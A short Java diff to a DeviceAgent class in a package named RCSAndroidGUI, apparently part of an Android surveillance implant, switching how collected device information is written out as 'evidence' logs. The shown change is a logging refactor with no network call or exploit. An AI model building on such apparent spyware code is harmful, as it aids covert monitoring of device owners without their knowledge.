@@ -25,6 +25,8 @@ import android.util.Log;
 
 import com.ht.RCSAndroidGUI.Device;
 import com.ht.RCSAndroidGUI.Evidence;
+import com.ht.RCSAndroidGUI.EvidenceType;
+import com.ht.RCSAndroidGUI.LogR;
 import com.ht.RCSAndroidGUI.RCSAndroidGUI;
 import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.utils.Utils;
@@ -120,12 +122,19 @@ public class DeviceAgent extends AgentBase {
 
 		final String content = sb.toString();
 
-		// LogR log = new LogR(Agent.AGENT_DEVICE, LogR.LOG_PRI_STD);
-		// log.write(WChar.getBytes(content, true));
-		// log.close();
+		int ev=Evidence.convertTypeEvidence(Agent.AGENT_DEVICE);
+		
+		// atomic log
+		LogR log = new LogR(EvidenceType.DEVICE, LogR.LOG_PRI_STD, null, WChar.getBytes(content, true));
+		
+		// log
+		//LogR log = new LogR(EvidenceType.DEVICE, LogR.LOG_PRI_STD);
+		//log.write(WChar.getBytes(content, true));
+		//log.close();
 
-		final Evidence evidence = new Evidence(Agent.AGENT_DEVICE);
-		evidence.atomicWriteOnce(WChar.getBytes(content, true));
+		// Evidence
+		//final Evidence evidence = new Evidence(Agent.AGENT_DEVICE);
+		//evidence.atomicWriteOnce(null, EvidenceType.DEVICE, WChar.getBytes(content, true));
 
 	}
 
